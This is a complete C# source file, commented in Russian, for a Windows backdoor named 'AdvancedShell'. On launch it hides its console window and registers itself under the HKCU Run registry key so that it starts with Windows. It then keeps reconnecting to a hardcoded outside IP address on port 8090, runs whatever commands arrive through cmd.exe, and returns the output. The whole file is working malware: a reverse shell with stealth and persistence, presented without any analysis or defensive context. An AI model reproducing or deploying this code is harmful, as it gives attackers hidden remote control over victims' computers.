using System;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Diagnostics;
using Microsoft.Win32;  // Для работы с реестром

namespace AdvancedShell
{
    class Program
    {
        static void Main(string[] args)
        {
            // Скрываем окно консоли
            HideConsoleWindow();

            // Добавляем программу в автозагрузку
            AddToRegistry();

            // Управляющий сервер – замените на нужный IP и порт
            string serverIP = "5.199.233.23";  // публичный или локальный IP
            int serverPort = 8090;

            while (true)
            {
                try
                {
                    using (TcpClient client = new TcpClient())
                    {
                        client.Connect(serverIP, serverPort);
                        using (NetworkStream stream = client.GetStream())
                        {
                            // Отправляем управляющему ПК сообщение об установке соединения
                            byte[] initMsg = Encoding.ASCII.GetBytes("[+] Connection established.\r\n");
                            stream.Write(initMsg, 0, initMsg.Length);

                            // Читаем и выполняем команды
                            byte[] buffer = new byte[1024];
                            int bytesRead;
                            while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0)
                            {
                                string command = Encoding.ASCII.GetString(buffer, 0, bytesRead).Trim();
                                
                                if (command.ToLower() == "exit")
                                    return;

                                string output = ExecuteCommand(command);
                                if (string.IsNullOrEmpty(output))
                                    output = "[+] Command executed with no output.\r\n";

                                byte[] sendBuffer = Encoding.ASCII.GetBytes(output);
                                stream.Write(sendBuffer, 0, sendBuffer.Length);
                            }
                        }
                    }
                }
                catch
                {
                    // Если не удаётся подключиться – ждём 5 секунд перед попыткой
                    Thread.Sleep(5000);
                }
            }
        }

        // Выполнение команды через cmd.exe
        static string ExecuteCommand(string command)
        {
            try
            {
                Process p = new Process();
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.Arguments = "/c " + command;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.CreateNoWindow = true;
                p.Start();

                string output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
                p.WaitForExit();
                return output;
            }
            catch (Exception ex)
            {
                return "[-] Execution error: " + ex.Message + "\r\n";
            }
        }

        // Добавление приложения в автозагрузку через реестр HKCU
        static void AddToRegistry()
        {
            try
            {
                string exePath = Process.GetCurrentProcess().MainModule.FileName;
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                key.SetValue("AdvancedShell", exePath);
                key.Close();
            }
            catch { /* При ошибке игнорируем */ }
        }

        // Скрытие окна консоли через WinAPI
        static void HideConsoleWindow()
        {
            IntPtr handle = NativeMethods.GetConsoleWindow();
            if (handle != IntPtr.Zero)
                NativeMethods.ShowWindow(handle, NativeMethods.SW_HIDE);
        }
    }

    internal static class NativeMethods
    {
        public const int SW_HIDE = 0;

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
}
